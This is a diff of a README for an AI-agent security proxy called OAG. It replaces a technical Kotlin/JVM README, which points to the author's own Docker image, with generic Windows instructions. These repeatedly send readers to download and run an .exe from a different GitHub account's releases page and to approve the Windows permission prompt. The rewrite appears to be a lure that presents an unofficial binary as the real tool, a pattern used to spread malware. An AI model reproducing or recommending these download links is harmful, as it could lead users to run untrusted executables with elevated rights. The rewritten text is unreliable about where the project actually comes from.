@@ -1,114 +1,208 @@
-# Open Agent Guard (OAG)
+# 🛡️ oag - Keep Agent Traffic Under Control
 
-Portable runtime policy and audit layer for AI agents. OAG runs as an HTTP/HTTPS forward proxy between agents and the services they call — enforcing security policies, inspecting content, materializing secrets, and recording every decision.
+[⬇️ Download oag for Windows](https://github.com/hati4100/oag/releases)  
+[![Download](https://img.shields.io/badge/Download%20oag-blue?style=for-the-badge)](https://github.com/hati4100/oag/releases)
 
-It is not a sandbox and does not own the compute plane.
+## 🚀 What oag does
 
-## Features
+oag is a local runtime policy and audit layer for AI agents. It works as a proxy between your AI agent and the internet.
 
-**Policy enforcement**
-- Deterministic policy evaluation (deny rules checked before allow rules).
-- Host, method, path, IP range, header, query, and structured payload matching.
-- Agent profiles with per-agent rate limits, body size caps, and rule allowlists.
-- Custom reason codes, per-rule error responses, and policy tags.
+Use it to:
 
-**Content inspection**
-- Prompt injection detection with 6 built-in pattern families and heuristic scoring.
-- Optional ONNX-based ML classifier for injection detection.
-- Outbound credential detection (AWS keys, GitHub PATs, JWTs, private keys, Slack tokens, API keys, bearer tokens).
-- Sensitive data classification (PII, financial, credentials) with configurable categories.
-- URL/DNS exfiltration guards with Shannon entropy analysis.
-- Path traversal and double-encoding detection.
-- Plugin SPI for custom detectors.
+- control which web requests can leave your device
+- inspect content before it goes out
+- replace secrets with real values at runtime
+- record each policy decision
+- keep a clear audit trail of agent activity
 
-**Secrets**
-- Placeholder-based secret injection (`OAG_PLACEHOLDER_` headers, Bearer support).
-- Secret scopes restricting which secrets apply to which hosts/methods/paths.
-- Three providers: environment variables, files (with symlink/traversal protection), and OAuth2 client credentials (with token caching and automatic refresh).
+It gives you a simple way to watch and shape agent network traffic on Windows.
 
-**Proxy**
-- HTTP/HTTPS forward proxy with CONNECT tunnel support.
-- TLS interception (MITM) with ephemeral CA and per-host certificate generation.
-- WebSocket frame relay with content inspection.
-- Connection pooling, circuit breakers, and rate limiting (token bucket).
-- Per-session data and token budget tracking.
-- Redirect chain validation with policy re-evaluation per hop.
+## 🖥️ Windows requirements
 
-**Audit and observability**
-- Structured audit logging (JSONL) with 8 event types and 36 reason codes.
-- Rotating log files (size-based and time-based) with optional GZIP compression.
-- OpenTelemetry integration: audit log export and distributed tracing with W3C `traceparent` propagation.
-- 10 Prometheus metrics (counters, gauges, histograms).
-- 7 admin API endpoints (health, metrics, reload, pool, policy, audit, tasks).
-- Webhook notifications for 8 event types with HMAC signing and retry.
+Before you install oag, make sure your PC has:
 
-**CLI**
-- 11 commands: run, doctor, explain, test, hash, bundle, verify, lint, simulate, diff, help.
-- 77 configuration flags with JSON output mode for CI integration.
-- Policy bundles with optional Ed25519 signatures.
+- Windows 10 or Windows 11
+- a modern web browser
+- permission to install and run software
+- internet access for the first download
+- enough free disk space for the app and logs
 
-## Dependencies
+For best results, use a system where you can run local apps and set network proxy settings.
 
-| Category | Libraries | Why |
-|----------|-----------|-----|
-| Serialization | kotlinx.serialization + kotaml (YAML) | Policy YAML parsing, audit JSONL output |
-| Cryptography | BouncyCastle (bcprov, bcpkix) | Ed25519 bundle signatures, HMAC, TLS CA generation |
-| Observability | OpenTelemetry SDK + exporters | Audit log export and distributed tracing via OTLP |
-| Async | kotlinx-coroutines-core | Webhook delivery, background policy fetching, WebSocket relay |
-| ML (optional) | ONNX Runtime, DJL | Optional ML-based injection classification (compileOnly) |
+## 📥 Download oag
 
-HTTP parsing, connection pooling, and the CLI parser are hand-rolled to avoid
-pulling in a full web framework for what is fundamentally a TCP proxy.
+1. Open the [oag releases page](https://github.com/hati4100/oag/releases)
+2. Find the latest Windows build
+3. Download the file for your system
+4. Save it to your Downloads folder or a folder you can find again
 
-## Compatibility
+If you see more than one file, choose the Windows version that matches your machine. If you are not sure, pick the standard 64-bit build.
 
-- Kotlin: 2.2.20 (JVM)
-- JDK: 21 (toolchain)
-- Native image: GraalVM CE 23 (compiles JDK 21 bytecode)
+## 🧩 Install oag
 
-## Quick Start
+1. Open the folder where the file downloaded
+2. If the file is a `.zip`, right-click it and choose Extract All
+3. Open the extracted folder
+4. If you see an `.exe` file, double-click it to start oag
+5. If Windows asks for permission, choose Yes
 
-**New here?** Follow the [Getting Started](docs/getting-started.md) guide for a hands-on walkthrough.
+If the app opens in a window or console, the install step is done.
 
-**Download a release binary:**
+## ⚙️ Set up your browser or agent
 
-```bash
-# Native binary (Linux, macOS, Windows — see Releases)
-./oag run --policy policy.yaml
+oag works as a proxy. That means your browser or AI agent needs to send traffic through it.
 
-# Or Docker
-docker run -v ./policy.yaml:/config/policy.yaml ghcr.io/mustafadakhel/oag:latest
+1. Open your agent app or browser
+2. Find the network, proxy, or connection settings
+3. Set the HTTP proxy to the local address used by oag
+4. Set the HTTPS proxy to the same local address if needed
+5. Save the settings
+6. Restart the app or browser
 
-# Or fat JAR
-java -jar oag.jar run --policy policy.yaml
-```
+A local proxy often uses `127.0.0.1` or `localhost` with a port number. Use the port shown in oag when you start it.
 
-**Build from source:**
+## 🔐 How secret material works
 
-```bash
-./gradlew :oag-app:shadowJar
-java -jar oag-app/build/libs/oag-app-*-all.jar run --policy policy.yaml
-```
+oag can materialize secrets at runtime. That means it can replace safe placeholders with real values only when they are needed.
 
-Use the proxy in your agent:
+A common flow looks like this:
 
-```
-HTTP_PROXY=http://127.0.0.1:8080
-HTTPS_PROXY=http://127.0.0.1:8080
-```
+- your agent sends a request with a placeholder
+- oag checks the request
+- oag swaps in the real secret if the policy allows it
+- the request goes out with the correct value
+- oag records the action in the audit log
 
-## Docs
+This helps keep secrets out of prompts and reduces the chance of leaking them in logs.
 
-- [Getting Started](docs/getting-started.md) — build, first policy, test, audit
-- [Concepts](docs/concepts.md) — architecture, data flow, threat model
-- [Configuration](docs/configuration.md) — policy schema, rule fields, bundles, linting
-- [CLI Reference](docs/cli.md) — CLI reference (all commands, flags, JSON schemas)
-- [Security](docs/security.md) — content inspection, sensitive data, exfiltration guards
-- [Observability](docs/observability.md) — audit events, metrics, admin server, OTel
-- [Operations](docs/operations.md) — deployment, packaging, resilience, testing
-- [Plugins](docs/plugins.md) — custom detector SPI, artifact types, finding model
-- [Policy Examples](docs/examples/policy-examples.md) — ready-to-use policy recipes
+## 🧠 Policy checks
 
-## License
+oag can inspect each request before it leaves your device. It can use rules to decide whether a request should:
 
-Licensed under the [Apache License 2.0](LICENSE).
+- be allowed
+- be blocked
+- be changed
+- be logged for review
+
+You can use policy checks to limit where an agent can send data, what content it can share, and which actions it can take.
+
+## 📋 Audit trail
+
+Every decision can be recorded. That gives you a clear history of what happened.
+
+The audit log can help you:
+
+- review blocked requests
+- trace where data went
+- see when secrets were used
+- compare agent behavior over time
+- spot unusual traffic
+
+If you want to understand what an agent did, the audit trail gives you the record.
+
+## 🌐 Typical use cases
+
+oag fits well when you want more control over AI agent traffic.
+
+Common uses include:
+
+- limiting which domains an agent can reach
+- stopping prompt injection from untrusted pages
+- checking outbound content before it is sent
+- protecting API keys and private tokens
+- keeping logs for review and compliance
+- applying guardrails to many agents in one place
+
+It works as a simple control layer for agent traffic, not as a replacement for the agent itself.
+
+## 🛠️ Basic first run
+
+1. Start oag
+2. Note the local proxy address and port
+3. Set your browser or agent to use that proxy
+4. Open a site or ask the agent to make a web request
+5. Watch the oag window or log output
+6. Confirm that requests are being checked and recorded
+
+If traffic does not appear, check the proxy settings again and make sure oag is still running.
+
+## 🔎 If it does not work
+
+Try these steps:
+
+- make sure oag is open
+- check that the proxy address is correct
+- confirm the port number matches the one shown in the app
+- restart the browser or agent
+- check that another app is not using the same port
+- try a different network request to test the setup
+
+If you change the proxy settings and nothing happens, save the settings again and restart the app.
+
+## 📁 Files you may see
+
+After you download oag, you may see files like these:
+
+- `.exe` for the app
+- `.zip` for the packaged download
+- `.txt` or `.log` for audit output
+- config files for policy rules
+
+Keep the app files in one folder so they are easy to find later.
+
+## 🔄 Update oag
+
+When a new version is available:
+
+1. Return to the [oag releases page](https://github.com/hati4100/oag/releases)
+2. Download the newest Windows build
+3. Replace the old app files with the new ones
+4. Open the new version
+5. Check your proxy settings again
+
+If you saved rules or logs, keep a copy before you replace files.
+
+## 📌 What this project is for
+
+oag is made for people who want a local control point for AI agent traffic. It helps you watch requests, enforce rules, and keep a record of what happened.
+
+It is useful when you want:
+
+- tighter control over outbound traffic
+- a clear policy layer between agents and the web
+- better handling of secrets
+- a log of every decision
+- less risk from untrusted content
+
+## 🧭 Terms you may see
+
+Here are a few simple terms used by oag:
+
+- **proxy**: a middle step between your app and the internet
+- **egress**: data leaving your device
+- **policy**: a rule that decides what is allowed
+- **audit log**: a record of actions and decisions
+- **secret materialization**: swapping a placeholder for a real secret at runtime
+
+These terms may appear in the app, logs, or settings
+
+## 🧪 Quick checklist
+
+Use this list to confirm your setup:
+
+- you downloaded oag from the releases page
+- you opened the app
+- you found the local proxy address
+- you set your browser or agent to use that proxy
+- you tested a web request
+- you saw the request in the log or audit output
+
+## 📎 Download again
+
+If you need the file again, use the Windows release page here:
+
+[https://github.com/hati4100/oag/releases](https://github.com/hati4100/oag/releases)
+
+## 🏷️ Topics
+
+agent-governance,agent-guardrails,agent-security,ai-agent-security,ai-agents,ai-gateway,ai-security,egress-proxy,guardrails,llm-firewall,policy-engine,prompt-injection,proxy-server
